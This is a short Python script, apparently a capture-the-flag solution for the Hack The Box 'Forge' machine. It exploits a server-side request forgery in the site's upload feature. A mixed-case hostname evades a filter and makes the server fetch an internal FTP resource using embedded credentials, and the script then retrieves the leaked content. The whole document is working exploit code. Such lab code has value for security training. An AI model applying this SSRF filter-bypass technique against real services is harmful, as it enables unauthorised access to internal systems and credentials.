import requests
import re

url = "http://forge.htb/upload"

data = {
        'url': 'http://aDmIn.FoRgE.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/',
        'remote':'1'
        }


r = requests.post(url, data=data)

reply = r.text.split('\n')

for item in reply:
    if '/uploads/' in item:
        print(item.strip())
        m = re.search('">(.*?)</strong>', item)
        url2 = m.group(1)


r2 = requests.get(url2)

print(r2.text)
